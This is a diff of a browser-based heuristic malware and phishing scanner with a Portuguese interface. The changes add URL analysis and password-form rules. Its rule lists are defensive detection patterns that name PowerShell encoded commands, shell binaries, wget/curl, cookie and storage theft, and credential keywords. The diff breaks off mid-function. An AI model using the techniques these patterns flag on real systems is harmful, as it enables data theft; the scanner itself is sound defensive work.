@@ -168,7 +168,6 @@ button{
     transform:translateY(-2px);
 }
 
-/* Resto dos estilos originais */
 header{
     display:flex;
     justify-content:space-between;
@@ -248,25 +247,11 @@ h1{
     margin-top:8px;
 }
 
-.green{
-    color:var(--green);
-}
-
-.orange{
-    color:var(--orange);
-}
-
-.red{
-    color:var(--red);
-}
-
-.blue{
-    color:var(--blue);
-}
-
-.yellow{
-    color:var(--yellow);
-}
+.green{ color:var(--green); }
+.orange{ color:var(--orange); }
+.red{ color:var(--red); }
+.blue{ color:var(--blue); }
+.yellow{ color:var(--yellow); }
 
 .main{
     display:grid;
@@ -280,6 +265,7 @@ h1{
     border-radius:18px;
     padding:20px;
     box-shadow:var(--shadow);
+    margin-bottom:20px;
 }
 
 .panel h2{
@@ -288,14 +274,14 @@ h1{
 }
 
 .dropzone{
-    min-height:210px;
+    min-height:180px;
     border:2px dashed #195b3b;
     border-radius:16px;
     display:flex;
     align-items:center;
     justify-content:center;
     text-align:center;
-    padding:30px;
+    padding:20px;
     transition:.2s;
     background:rgba(0,255,136,.025);
 }
@@ -307,8 +293,8 @@ h1{
 }
 
 .drop-icon{
-    font-size:50px;
-    margin-bottom:10px;
+    font-size:40px;
+    margin-bottom:8px;
 }
 
 .dropzone strong{
@@ -377,12 +363,6 @@ select:focus{
     box-shadow:0 0 10px rgba(0,255,136,.1);
 }
 
-.form-grid{
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:10px;
-}
-
 .progress{
     height:12px;
     background:#020805;
@@ -427,17 +407,9 @@ select:focus{
     padding:16px;
 }
 
-.result.medium{
-    border-left-color:var(--yellow);
-}
-
-.result.high{
-    border-left-color:var(--orange);
-}
-
-.result.critical{
-    border-left-color:var(--red);
-}
+.result.medium{ border-left-color:var(--yellow); }
+.result.high{ border-left-color:var(--orange); }
+.result.critical{ border-left-color:var(--red); }
 
 .result-head{
     display:flex;
@@ -466,25 +438,10 @@ select:focus{
     white-space:nowrap;
 }
 
-.badge.low{
-    color:#00170c;
-    background:var(--green);
-}
-
-.badge.medium{
-    color:#191300;
-    background:var(--yellow);
-}
-
-.badge.high{
-    color:#211000;
-    background:var(--orange);
-}
-
-.badge.critical{
-    color:#fff;
-    background:var(--red);
-}
+.badge.low{ color:#00170c; background:var(--green); }
+.badge.medium{ color:#191300; background:var(--yellow); }
+.badge.high{ color:#211000; background:var(--orange); }
+.badge.critical{ color:#fff; background:var(--red); }
 
 .score{
     font-size:25px;
@@ -660,54 +617,24 @@ select:focus{
 }
 
 @media(max-width:1100px){
-    .dashboard{
-        grid-template-columns:repeat(3,1fr);
-    }
-
-    .main{
-        grid-template-columns:1fr;
-    }
+    .dashboard{ grid-template-columns:repeat(3,1fr); }
+    .main{ grid-template-columns:1fr; }
 }
 
 @media(max-width:700px){
-    .app{
-        padding:10px;
-    }
-
-    header{
-        flex-direction:column;
-        align-items:flex-start;
-    }
-
-    .dashboard{
-        grid-template-columns:repeat(2,1fr);
-    }
-
-    .filters,
-    .form-grid{
-        grid-template-columns:1fr;
-    }
-
-    .result-grid{
-        grid-template-columns:repeat(2,1fr);
-    }
-
-    .result-head{
-        flex-direction:column;
-    }
-
+    .app{ padding:10px; }
+    header{ flex-direction:column; align-items:flex-start; }
+    .dashboard{ grid-template-columns:repeat(2,1fr); }
+    .filters, .form-grid{ grid-template-columns:1fr; }
+    .result-grid{ grid-template-columns:repeat(2,1fr); }
+    .result-head{ flex-direction:column; }
     .cover-title{ font-size:35px; }
     .cover-logo{ font-size:90px; }
 }
 
 @media(max-width:420px){
-    .dashboard{
-        grid-template-columns:1fr;
-    }
-
-    .result-grid{
-        grid-template-columns:1fr;
-    }
+    .dashboard{ grid-template-columns:1fr; }
+    .result-grid{ grid-template-columns:1fr; }
 }
 </style>
 </head>
@@ -719,12 +646,12 @@ select:focus{
     <div class="cover-content">
         <div class="cover-logo">🛡️</div>
         <h2 class="cover-title">NeonAV Secure PRO ULTRA</h2>
-        <div class="cover-subtitle">Scanner Heurístico Multiplataforma</div>
+        <div class="cover-subtitle">Scanner Heurístico Multiplataforma • Arquivos & URLs</div>
         
         <div class="cover-features">
             <span class="cover-feature">Proteção Offline</span>
             <span class="cover-feature">SHA-512</span>
-            <span class="cover-feature">Análise IOC</span>
+            <span class="cover-feature">Análise IOC & Phishing</span>
             <span class="cover-feature">Entropia de Bytes</span>
         </div>
 
@@ -738,14 +665,12 @@ select:focus{
 <div class="app">
 
 <header>
-
 <div class="brand">
 <div class="logo">🛡️</div>
-
 <div>
 <h1>NeonAV Secure PRO ULTRA</h1>
 <div class="subtitle">
-Scanner heurístico multiplataforma • SHA-512 • IOC • Entropia
+Scanner heurístico multiplataforma • SHA-512 • IOC • Phishing & Entropia
 </div>
 </div>
 </div>
@@ -753,14 +678,12 @@ Scanner heurístico multiplataforma • SHA-512 • IOC • Entropia
 <div class="status" id="status">
 ● SISTEMA PRONTO
 </div>
-
 </header>
 
 
 <section class="dashboard">
-
 <div class="card">
-<div class="metric-title">Arquivos</div>
+<div class="metric-title">Arquivos/URLs</div>
 <div class="metric-value green" id="totalFiles">0</div>
 </div>
 
@@ -783,7 +706,6 @@ Scanner heurístico multiplataforma • SHA-512 • IOC • Entropia
 <div class="metric-title">Crítico</div>
 <div class="metric-value red" id="criticalCount">0</div>
 </div>
-
 </section>
 
 
@@ -792,153 +714,69 @@ Scanner heurístico multiplataforma • SHA-512 • IOC • Entropia
 <main>
 
 <section class="panel">
-
-<h2>🔍 Área de análise</h2>
+<h2>🔍 Área de análise de arquivos</h2>
 
 <div class="dropzone" id="dropzone">
-
 <div>
-
 <div class="drop-icon">📁</div>
-
 <strong>Arraste arquivos aqui</strong>
-
-<div style="margin:8px;color:var(--muted)">
-ou utilize o botão abaixo
+<div style="margin:8px;color:var(--muted)">ou utilize o botão abaixo</div>
+<input type="file" id="fileInput" multiple style="display:none">
+<button class="btn primary" id="selectBtn">Selecionar arquivos</button>
+</div>
 </div>
 
-<input
-type="file"
-id="fileInput"
-multiple
-style="display:none"
->
-
-<button
-class="btn primary"
-id="selectBtn"
->
-Selecionar arquivos
-</button>
-
+<!-- Nova Seção de Análise de URL -->
+<div style="margin-top:15px; border-top:1px solid var(--border); padding-top:15px;">
+    <label class="metric-title" style="display:block; margin-bottom:8px;">🌐 Analisar URL / Website (Opção B)</label>
+    <div style="display:flex; gap:10px;">
+        <input type="url" id="urlInput" placeholder="https://exemplo.com" style="flex:1;">
+        <button class="btn primary" id="scanUrlBtn" style="white-space:nowrap;">Analisar URL</button>
+    </div>
 </div>
 
+<div class="actions" style="margin-top:15px;">
+<button class="btn primary" id="scanBtn">🛡️ Iniciar análise da fila</button>
+<button class="btn blue" id="testBtn">🧪 Arquivos de teste</button>
+<button class="btn" id="jsonBtn">JSON</button>
+<button class="btn" id="csvBtn">CSV</button>
+<button class="btn" id="htmlBtn">Relatório HTML</button>
+<button class="btn danger" id="clearBtn">Limpar</button>
 </div>
-
-
-<div class="actions">
-
-<button class="btn primary" id="scanBtn">
-🛡️ Iniciar análise
-</button>
-
-<button class="btn blue" id="testBtn">
-🧪 Arquivos de teste
-</button>
-
-<button class="btn" id="jsonBtn">
-JSON
-</button>
-
-<button class="btn" id="csvBtn">
-CSV
-</button>
-
-<button class="btn" id="htmlBtn">
-Relatório HTML
-</button>
-
-<button class="btn danger" id="clearBtn">
-Limpar
-</button>
-
-</div>
-
 
 <div class="progress">
-
-<div
-class="progress-bar"
-id="progressBar"
-></div>
-
+<div class="progress-bar" id="progressBar"></div>
 </div>
 
-<div
-class="progress-text"
-id="progressText"
->
-Aguardando arquivos...
+<div class="progress-text" id="progressText">
+Aguardando arquivos ou URLs...
 </div>
-
 </section>
 
 
 <section class="panel">
-
 <h2>📋 Resultados</h2>
 
 <div class="filters">
-
-<input
-id="searchInput"
-placeholder="🔎 Pesquisar arquivo, hash ou IOC..."
->
-
+<input id="searchInput" placeholder="🔎 Pesquisar arquivo, hash, URL ou IOC...">
 <select id="riskFilter">
-
-<option value="all">
-Todos os riscos
-</option>
-
-<option value="low">
-Baixo
-</option>
-
-<option value="medium">
-Médio
-</option>
-
-<option value="high">
-Alto
-</option>
-
-<option value="critical">
-Crítico
-</option>
-
+<option value="all">Todos os riscos</option>
+<option value="low">Baixo</option>
+<option value="medium">Médio</option>
+<option value="high">Alto</option>
+<option value="critical">Crítico</option>
 </select>
-
 <select id="sortSelect">
-
-<option value="new">
-Mais recentes
-</option>
-
-<option value="score">
-Maior risco
-</option>
-
-<option value="name">
-Nome
-</option>
-
-<option value="size">
-Tamanho
-</option>
-
+<option value="new">Mais recentes</option>
+<option value="score">Maior risco</option>
+<option value="name">Nome</option>
+<option value="size">Tamanho</option>
 </select>
-
 </div>
 
 <div id="results" class="results">
-
-<div class="empty">
-Nenhum arquivo analisado.
+<div class="empty">Nenhum arquivo ou URL analisada.</div>
 </div>
-
-</div>
-
 </section>
 
 </main>
@@ -947,168 +785,82 @@ Nenhum arquivo analisado.
 <aside>
 
 <section class="panel">
-
 <h2>📊 Estatísticas</h2>
-
-<div class="metric-title">
-Média de risco
-</div>
-
-<div
-class="metric-value green"
-id="averageScore"
->
-0
-</div>
+<div class="metric-title">Média de risco</div>
+<div class="metric-value green" id="averageScore">0</div>
 
 <div class="stats-bar">
-
 <div class="stats-label">
 <span>Baixo</span>
 <span id="lowPercent">0%</span>
 </div>
-
-<div class="stats-track">
-<div
-class="stats-fill"
-id="lowFill"
-style="width:0%"
-></div>
+<div class="stats-track"><div class="stats-fill" id="lowFill" style="width:0%"></div></div>
 </div>
-
-</div>
-
 
 <div class="stats-bar">
-
 <div class="stats-label">
 <span>Médio</span>
 <span id="mediumPercent">0%</span>
 </div>
-
-<div class="stats-track">
-<div
-class="stats-fill"
-id="mediumFill"
-style="width:0%"
-></div>
+<div class="stats-track"><div class="stats-fill" id="mediumFill" style="width:0%"></div></div>
 </div>
-
-</div>
-
 
 <div class="stats-bar">
-
 <div class="stats-label">
 <span>Alto</span>
 <span id="highPercent">0%</span>
 </div>
-
-<div class="stats-track">
-<div
-class="stats-fill"
-id="highFill"
-style="width:0%"
-></div>
+<div class="stats-track"><div class="stats-fill" id="highFill" style="width:0%"></div></div>
 </div>
-
-</div>
-
 
 <div class="stats-bar">
-
 <div class="stats-label">
 <span>Crítico</span>
 <span id="criticalPercent">0%</span>
 </div>
-
-<div class="stats-track">
-<div
-class="stats-fill"
-id="criticalFill"
-style="width:0%"
-></div>
+<div class="stats-track"><div class="stats-fill" id="criticalFill" style="width:0%"></div></div>
 </div>
-
-</div>
-
 </section>
 
 
 <section class="panel">
-
 <h2>⚙️ Configurações</h2>
-
 <div class="toggle">
 <span>Detectar URLs</span>
-<input
-type="checkbox"
-id="cfgUrls"
-checked
->
+<input type="checkbox" id="cfgUrls" checked>
 </div>
-
 <div class="toggle">
 <span>Analisar entropia</span>
-<input
-type="checkbox"
-id="cfgEntropy"
-checked
->
+<input type="checkbox" id="cfgEntropy" checked>
 </div>
-
 <div class="toggle">
 <span>Detectar extensões suspeitas</span>
-<input
-type="checkbox"
-id="cfgExtension"
-checked
->
+<input type="checkbox" id="cfgExtension" checked>
 </div>
-
 <div class="toggle">
-<span>Detectar IOCs</span>
-<input
-type="checkbox"
-id="cfgIoc"
-checked
->
+<span>Detectar IOCs & Phishing</span>
+<input type="checkbox" id="cfgIoc" checked>
 </div>
 
 <div style="margin-top:15px">
-
-<label class="metric-title">
-Limite por arquivo
-</label>
-
+<label class="metric-title">Limite por arquivo</label>
 <select id="sizeLimit">
-
 <option value="5">5 MB</option>
 <option value="10" selected>10 MB</option>
 <option value="25">25 MB</option>
 <option value="50">50 MB</option>
-
 </select>
-
 </div>
-
 </section>
 
 
 <section class="panel">
-
 <h2>📝 Log</h2>
-
-<div
-class="log"
-id="log"
->
+<div class="log" id="log">
 <div class="log-line">
-<span class="log-time">[READY]</span>
-NeonAV inicializado.
+<span class="log-time">[READY]</span> NeonAV inicializado.
 </div>
 </div>
-
 </section>
 
 </aside>
@@ -1124,131 +876,53 @@ NeonAV Secure PRO ULTRA • Suporte Android, iOS e Windows • Uso defensivo
 
 
 <div class="modal" id="testModal">
-
 <div class="modal-box">
-
-<button
-class="close"
-id="closeModal"
->
-×
-</button>
-
+<button class="close" id="closeModal">×</button>
 <h2>🧪 Laboratório de testes</h2>
-
 <p style="color:var(--muted)">
 Estes arquivos são gerados localmente e não contêm malware real.
 Eles servem apenas para testar as heurísticas do NeonAV.
 </p>
 
 <div class="test-file">
-
-<div>
-<strong>Arquivo limpo</strong>
-<div class="meta">
-Texto sem indicadores
+<div><strong>Arquivo limpo</strong><div class="meta">Texto sem indicadores</div></div>
+<button class="btn primary" data-test="clean">Adicionar</button>
 </div>
-</div>
-
-<button
-class="btn primary"
-data-test="clean"
->
-Adicionar
-</button>
-
-</div>
-
 
 <div class="test-file">
-
-<div>
-<strong>Teste JavaScript</strong>
-<div class="meta">
-Simula indicadores de keylogger/obfuscação
+<div><strong>Teste JavaScript</strong><div class="meta">Simula indicadores de keylogger/obfuscação</div></div>
+<button class="btn warning" data-test="js">Adicionar</button>
 </div>
-</div>
-
-<button
-class="btn warning"
-data-test="js"
->
-Adicionar
-</button>
-
-</div>
-
 
 <div class="test-file">
-
-<div>
-<strong>Teste Stealer</strong>
-<div class="meta">
-Simula indicadores de coleta de dados
+<div><strong>Teste Stealer</strong><div class="meta">Simula indicadores de coleta de dados</div></div>
+<button class="btn warning" data-test="stealer">Adicionar</button>
 </div>
-</div>
-
-<button
-class="btn warning"
-data-test="stealer"
->
-Adicionar
-</button>
-
-</div>
-
 
 <div class="test-file">
-
-<div>
-<strong>Teste PowerShell</strong>
-<div class="meta">
-Simula comandos PowerShell suspeitos
+<div><strong>Teste PowerShell</strong><div class="meta">Simula comandos PowerShell suspeitos</div></div>
+<button class="btn danger" data-test="powershell">Adicionar</button>
 </div>
-</div>
-
-<button
-class="btn danger"
-data-test="powershell"
->
-Adicionar
-</button>
-
-</div>
-
 
 <div class="test-file">
-
-<div>
-<strong>Teste crítico</strong>
-<div class="meta">
-Combinação de vários indicadores
-</div>
+<div><strong>Teste de Phishing / Formulário Falso</strong><div class="meta">Simula campos de senha falsos e ação externa</div></div>
+<button class="btn danger" data-test="phishing">Adicionar</button>
 </div>
 
-<button
-class="btn danger"
-data-test="critical"
->
-Adicionar
-</button>
-
+<div class="test-file">
+<div><strong>Teste crítico</strong><div class="meta">Combinação de vários indicadores</div></div>
+<button class="btn danger" data-test="critical">Adicionar</button>
 </div>
-
 </div>
-
 </div>
 
 
 <script>
-
 "use strict";
-
 
 /* =========================================================
    CONTROLES DA CAPA (BOTÕES CLICÁVEIS)
 ========================================================= */
-
 const coverScreen = document.getElementById("coverScreen");
 const coverStartBtn = document.getElementById("coverStartBtn");
 const coverTestBtn = document.getElementById("coverTestBtn");
@@ -1263,174 +937,158 @@ coverTestBtn.addEventListener("click", () => {
     testModal.classList.add("show");
 });
 
-
 /* =========================================================
    CONFIGURAÇÃO
 ========================================================= */
-
-const STORAGE_KEY = "neonav-secure-pro-ultra";
+const STORAGE_KEY = "neonav-secure-pro-ultra-v2";
 
 let filesQueue = [];
 let resultsData = [];
 let scanning = false;
 
-
 /* =========================================================
-   REGRAS HEURÍSTICAS
+   REGRAS HEURÍSTICAS (Incluindo Phishing & Formulário de Senha)
 ========================================================= */
-
 const RULES = [
-
 {
-name:"Keylogger",
-score:8,
-patterns:[
-"keydown",
-"keypress",
-"keyup",
-"document.onkeydown",
-"keyboardevent",
-"addEventListener('keydown'",
-"addEventListener(\"keydown\""
-]
+    name:"Formulário de Senha Suspeito",
+    score:9,
+    patterns:[
+        'type="password"',
+        "type='password'",
+        'name="password"',
+        "name='password'",
+        'name="senha"',
+        "name='senha'",
+        'name="passwd"',
+        "name='passwd'",
+        'autocomplete="current-password"',
+        'autocomplete="new-password"'
+    ]
 },
-
 {
-name:"Stealer",
-score:10,
-patterns:[
-"localStorage",
-"sessionStorage",
-"document.cookie",
-"sendBeacon",
-"navigator.sendBeacon",
-"fetch(",
-"xmlhttprequest"
-]
+    name:"Formulário com Ação Externa",
+    score:8,
+    patterns:[
+        'action="http://',
+        "action='http://",
+        'action="//',
+        "action='//"
+    ]
 },
-
 {
-name:"Obfuscação",
-score:7,
-patterns:[
-"eval(",
-"atob(",
-"btoa(",
-"Function(",
-"fromCharCode",
-"unescape(",
-"decodeURIComponent("
-]
+    name:"Keylogger",
+    score:8,
+    patterns:[
+        "keydown",
+        "keypress",
+        "keyup",
+        "document.onkeydown",
+        "keyboardevent",
+        "addEventListener('keydown'",
+        "addEventListener(\"keydown\""
+    ]
 },
-
 {
-name:"PowerShell",
-score:7,
-patterns:[
-"powershell",
-"powershell.exe",
-"-encodedcommand",
-"invoke-expression",
-"iex ",
-"set-executionpolicy"
-]
+    name:"Stealer",
+    score:10,
+    patterns:[
+        "localStorage",
+        "sessionStorage",
+        "document.cookie",
+        "sendBeacon",
+        "navigator.sendBeacon",
+        "fetch(",
+        "xmlhttprequest"
+    ]
 },
-
 {
-name:"Shell",
-score:6,
-patterns:[
-"/bin/sh",
-"/bin/bash",
-"cmd.exe",
-"shell_execute",
-"child_process",
-"exec("
-]
+    name:"Obfuscação",
+    score:7,
+    patterns:[
+        "eval(",
+        "atob(",
+        "btoa(",
+        "Function(",
+        "fromCharCode",
+        "unescape(",
+        "decodeURIComponent("
+    ]
 },
-
 {
-name:"Download",
-score:5,
-patterns:[
-"download",
-"createObjectURL",
-"application/octet-stream",
-"wget ",
-"curl "
-]
+    name:"PowerShell",
+    score:7,
+    patterns:[
+        "powershell",
+        "powershell.exe",
+        "-encodedcommand",
+        "invoke-expression",
+        "iex ",
+        "set-executionpolicy"
+    ]
 },
-
 {
-name:"Persistência",
-score:8,
-patterns:[
-"startup",
-"autorun",
-"runonce",
-"scheduled task",
-"crontab",
-"registry"
-]
+    name:"Shell",
+    score:6,
+    patterns:[
+        "/bin/sh",
+        "/bin/bash",
+        "cmd.exe",
+        "shell_execute",
+        "child_process",
+        "exec("
+    ]
 },
-
 {
-name:"Credenciais",
-score:9,
-patterns:[
-"password",
-"passwd",
-"credential",
-"token",
-"authorization",
-"bearer "
-]
+    name:"Download",
+    score:5,
+    patterns:[
+        "download",
+        "createObjectURL",
+        "application/octet-stream",
+        "wget ",
+        "curl "
+    ]
 },
-
 {
-name:"Rede suspeita",
-score:5,
-patterns:[
-"websocket",
-"socket",
-"ftp://",
-"irc://"
-]
+    name:"Persistência",
+    score:8,
+    patterns:[
+        "startup",
+        "autorun",
+        "runonce",
+        "scheduled task",
+        "crontab",
+        "registry"
+    ]
+},
+{
+    name:"Credenciais",
+    score:9,
+    patterns:[
+        "password",
+        "passwd",
+        "credential",
+        "token",
+        "authorization",
+        "bearer "
+    ]
+},
+{
+    name:"Rede suspeita",
+    score:5,
+    patterns:[
+        "websocket",
+        "socket",
+        "ftp://",
+        "irc://"
+    ]
 }
-
 ];
-
-
-/* =========================================================
-   EXTENSÕES
-========================================================= */
 
 const SUSPICIOUS_EXTENSIONS = [
-
-".exe",
-".scr",
-".bat",
-".cmd",
-".ps1",
-".vbs",
-".vbe",
-".js",
-".jse",
-".hta",
-".msi",
-".dll",
-".jar",
-".apk",
-".com",
-".pif",
-".reg"
-
+".exe", ".scr", ".bat", ".cmd", ".ps1", ".vbs", ".vbe", ".js", ".jse", ".hta", ".msi", ".dll", ".jar", ".apk", ".com", ".pif", ".reg"
 ];
-
-
-/* =========================================================
-   DOM
-========================================================= */
 
 const $ = id => document.getElementById(id);
 
@@ -1438,2031 +1096,589 @@ const fileInput = $("fileInput");
 const selectBtn = $("selectBtn");
 const dropzone = $("dropzone");
 const scanBtn = $("scanBtn");
-
 const resultsBox = $("results");
-
 const searchInput = $("searchInput");
 const riskFilter = $("riskFilter");
 const sortSelect = $("sortSelect");
-
 const progressBar = $("progressBar");
 const progressText = $("progressText");
-
 const status = $("status");
-
 const logBox = $("log");
 
-
-/* =========================================================
-   UTILITÁRIOS
-========================================================= */
-
 function escapeHTML(value){
-
-return String(value ?? "")
-.replace(/&/g,"&amp;")
-.replace(/</g,"&lt;")
-.replace(/>/g,"&gt;")
-.replace(/"/g,"&quot;")
-.replace(/'/g,"&#039;");
-
+    return String(value ?? "")
+    .replace(/&/g,"&amp;")
+    .replace(/</g,"&lt;")
+    .replace(/>/g,"&gt;")
+    .replace(/"/g,"&quot;")
+    .replace(/'/g,"&#039;");
 }
-
 
 function formatBytes(bytes){
-
-if(bytes === 0) return "0 B";
-
-const units = [
-"B",
-"KB",
-"MB",
-"GB"
-];
-
-const i = Math.floor(
-Math.log(bytes) / Math.log(1024)
-);
-
-return (
-bytes /
-Math.pow(1024,i)
-).toFixed(i === 0 ? 0 : 2)
-+" "+units[i];
-
+    if(bytes === 0) return "0 B";
+    const units = ["B", "KB", "MB", "GB"];
+    const i = Math.floor(Math.log(bytes) / Math.log(1024));
+    return (bytes / Math.pow(1024,i)).toFixed(i === 0 ? 0 : 2) + " " + units[i];
 }
-
 
 function formatDate(date){
-
-return new Date(date)
-.toLocaleString("pt-BR");
-
+    return new Date(date).toLocaleString("pt-BR");
 }
-
 
 function uuid(){
-
-if(
-window.crypto &&
-typeof window.crypto.randomUUID === "function"
-){
-
-return window.crypto.randomUUID();
-
+    if(window.crypto && typeof window.crypto.randomUUID === "function"){
+        return window.crypto.randomUUID();
+    }
+    return Date.now().toString(36) + Math.random().toString(36).slice(2);
 }
 
-return (
-Date.now().toString(36)
-+
-Math.random().toString(36).slice(2)
-);
-
+function log(message, type="INFO"){
+    const now = new Date().toLocaleTimeString("pt-BR");
+    const line = document.createElement("div");
+    line.className = "log-line";
+    line.innerHTML = `<span class="log-time">[${escapeHTML(type)} ${now}]</span> ${escapeHTML(message)}`;
+    logBox.prepend(line);
 }
-
-
-function log(message,type="INFO"){
-
-const now = new Date()
-.toLocaleTimeString("pt-BR");
-
-const line = document.createElement("div");
-
-line.className = "log-line";
-
-line.innerHTML =
-`<span class="log-time">[${escapeHTML(type)} ${now}]</span>
-${escapeHTML(message)}`;
-
-logBox.prepend(line);
-
-}
-
 
 function toast(message){
-
-status.textContent = "● "+message;
-
-setTimeout(()=>{
-
-status.textContent = "● SISTEMA PRONTO";
-
-},2500);
-
+    status.textContent = "● " + message;
+    setTimeout(() => { status.textContent = "● SISTEMA PRONTO"; }, 2500);
 }
-
-
-/* =========================================================
-   SHA-512
-========================================================= */
 
 async function sha512(buffer){
-
-if(
-!window.crypto ||
-!window.crypto.subtle
-){
-
-throw new Error(
-"SHA-512 indisponível neste contexto do navegador."
-);
-
+    if(!window.crypto || !window.crypto.subtle){
+        throw new Error("SHA-512 indisponível neste contexto do navegador.");
+    }
+    const hashBuffer = await window.crypto.subtle.digest("SHA-512", buffer);
+    const bytes = new Uint8Array(hashBuffer);
+    return Array.from(bytes).map(b => b.toString(16).padStart(2,"0")).join("");
 }
-
-const hashBuffer =
-await window.crypto.subtle.digest(
-"SHA-512",
-buffer
-);
-
-const bytes =
-new Uint8Array(hashBuffer);
-
-return Array
-.from(bytes)
-.map(b=>b.toString(16).padStart(2,"0"))
-.join("");
-
-}
-
-
-/* =========================================================
-   ENTROPIA DOS BYTES
-========================================================= */
 
 function calculateByteEntropy(bytes){
-
-if(!bytes.length){
-return 0;
+    if(!bytes.length) return 0;
+    const frequency = new Array(256).fill(0);
+    for(const byte of bytes) frequency[byte]++;
+    let entropy = 0;
+    for(const count of frequency){
+        if(count === 0) continue;
+        const probability = count / bytes.length;
+        entropy -= probability * Math.log2(probability);
+    }
+    return entropy;
 }
-
-const frequency =
-new Array(256).fill(0);
-
-for(const byte of bytes){
-
-frequency[byte]++;
-
-}
-
-let entropy = 0;
-
-for(const count of frequency){
-
-if(count === 0){
-continue;
-}
-
-const probability =
-count / bytes.length;
-
-entropy -=
-probability *
-Math.log2(probability);
-
-}
-
-return entropy;
-
-}
-
-
-/* =========================================================
-   TEXTO
-========================================================= */
 
 async function readTextSafely(file){
-
-try{
-
-return await file.text();
-
-}catch{
-
-return "";
-
+    try { return await file.text(); } catch { return ""; }
 }
-
-}
-
-
-/* =========================================================
-   IOC
-========================================================= */
 
 function detectIOCs(text){
-
-const found = [];
-
-const patterns = [
-
-{
-type:"URL",
-regex:/https?:\/\/[^\s"'<>]+/gi
-},
-
-{
-type:"IPv4",
-regex:/\b(?:\d{1,3}\.){3}\d{1,3}\b/g
-},
-
-{
-type:"Email",
-regex:/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi
-},
-
-{
-type:"Domain",
-regex:/\b[a-z0-9.-]+\.(?:com|net|org|io|ru|cn|xyz|top|online|site|onion)\b/gi
+    const found = [];
+    const patterns = [
+        { type:"URL", regex:/https?:\/\/[^\s"'<>]+/gi },
+        { type:"IPv4", regex:/\b(?:\d{1,3}\.){3}\d{1,3}\b/g },
+        { type:"Email", regex:/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi },
+        { type:"Domain", regex:/\b[a-z0-9.-]+\.(?:com|net|org|io|ru|cn|xyz|top|online|site|onion)\b/gi }
+    ];
+    for(const item of patterns){
+        const matches = text.match(item.regex) || [];
+        for(const match of matches){
+            if(!found.some(x => x.value.toLowerCase() === match.toLowerCase())){
+                found.push({ type:item.type, value:match });
+            }
+        }
+    }
+    return found.slice(0,50);
 }
-
-];
-
-for(const item of patterns){
-
-const matches =
-text.match(item.regex) || [];
-
-for(const match of matches){
-
-if(!found.some(
-x=>x.value.toLowerCase() ===
-match.toLowerCase()
-)){
-
-found.push({
-type:item.type,
-value:match
-});
-
-}
-
-}
-
-}
-
-return found.slice(0,50);
-
-}
-
-
-/* =========================================================
-   URLS SUSPEITAS
-========================================================= */
 
 function suspiciousURLs(iocs){
-
-const suspiciousDomains = [
-
-"bit.ly",
-"tinyurl.com",
-"t.co",
-"goo.gl",
-"cutt.ly",
-"is.gd",
-"rb.gy",
-"ow.ly"
-
-];
-
-return iocs.filter(ioc=>{
-
-if(ioc.type !== "URL"){
-return false;
+    const suspiciousDomains = ["bit.ly", "tinyurl.com", "t.co", "goo.gl", "cutt.ly", "is.gd", "rb.gy", "ow.ly"];
+    return iocs.filter(ioc => {
+        if(ioc.type !== "URL") return false;
+        const value = ioc.value.toLowerCase();
+        return suspiciousDomains.some(domain => value.includes(domain)) || value.includes(".onion");
+    });
 }
-
-const value =
-ioc.value.toLowerCase();
-
-return suspiciousDomains.some(
-domain=>value.includes(domain)
-)
-||
-value.includes(".onion");
-
-});
-
-}
-
-
-/* =========================================================
-   REGRAS
-========================================================= */
 
 function runRules(text){
-
-const lower =
-text.toLowerCase();
-
-const detections = [];
-
-let score = 0;
-
-for(const rule of RULES){
-
-const matched = [];
-
-for(const pattern of rule.patterns){
-
-if(
-lower.includes(pattern.toLowerCase())
-){
-
-matched.push(pattern);
-
+    const lower = text.toLowerCase();
+    const detections = [];
+    let score = 0;
+    for(const rule of RULES){
+        const matched = [];
+        for(const pattern of rule.patterns){
+            if(lower.includes(pattern.toLowerCase())){
+                matched.push(pattern);
+            }
+        }
+        if(matched.length){
+            score += rule.score;
+            detections.push({ rule:rule.name, score:rule.score, patterns:matched });
+        }
+    }
+    return { score, detections };
 }
-
-}
-
-if(matched.length){
-
-score += rule.score;
-
-detections.push({
-
-rule:rule.name,
-score:rule.score,
-patterns:matched
-
-});
-
-}
-
-}
-
-return {
-score,
-detections
-};
-
-}
-
-
-/* =========================================================
-   RISCO
-========================================================= */
 
 function riskFromScore(score){
-
-if(score <= 3){
-
-return {
-level:"low",
-label:"BAIXO"
-};
-
+    if(score <= 3) return { level:"low", label:"BAIXO" };
+    if(score <= 8) return { level:"medium", label:"MÉDIO" };
+    if(score <= 15) return { level:"high", label:"ALTO" };
+    return { level:"critical", label:"CRÍTICO" };
 }
 
-if(score <= 8){
+async function analyzeFile(file, index, total){
+    const maxMB = Number($("sizeLimit").value);
+    const maxBytes = maxMB * 1024 * 1024;
 
-return {
-level:"medium",
-label:"MÉDIO"
-};
+    log(`Analisando ${file.name}`, "SCAN");
 
+    if(file.size > maxBytes){
+        log(`${file.name}: tamanho excede ${maxMB} MB`, "WARNING");
+        return {
+            id:uuid(), name:file.name, size:file.size, type:file.type || "desconhecido",
+            modified:file.lastModified, timestamp:Date.now(), score:0, risk:"medium",
+            riskLabel:"NÃO ANALISADO", error:`Arquivo excede o limite de ${maxMB} MB.`,
+            hash:"", entropy:0, detections:[], iocs:[], suspiciousURLs:[]
+        };
+    }
+
+    const buffer = await file.arrayBuffer();
+    let hash = "";
+    try { hash = await sha512(buffer); } catch(error) { log("Erro no SHA-512: "+error.message, "ERROR"); }
+
+    const bytes = new Uint8Array(buffer);
+    const entropy = $("cfgEntropy").checked ? calculateByteEntropy(bytes) : 0;
+    const text = await readTextSafely(file);
+    const rules = runRules(text);
+    let score = rules.score;
+    const reasons = [];
+
+    for(const detection of rules.detections){
+        reasons.push(`${detection.rule}: ${detection.patterns.join(", ")}`);
+    }
+
+    if($("cfgExtension").checked){
+        const lowerName = file.name.toLowerCase();
+        const extension = "." + (lowerName.includes(".") ? lowerName.split(".").pop() : "");
+        if(SUSPICIOUS_EXTENSIONS.includes(extension)){
+            score += 3;
+            reasons.push(`Extensão potencialmente executável/sensível: ${extension}`);
+        }
+    }
+
+    if($("cfgEntropy").checked && entropy >= 7.2){
+        score += 5;
+        reasons.push(`Entropia de bytes elevada: ${entropy.toFixed(2)} bits`);
+    }
+
+    let iocs = [];
+    if($("cfgIoc").checked){
+        iocs = detectIOCs(text);
+        if(iocs.length) reasons.push(`${iocs.length} IOC(s) detectado(s)`);
+    }
+
+    let suspicious = [];
+    if($("cfgUrls").checked){
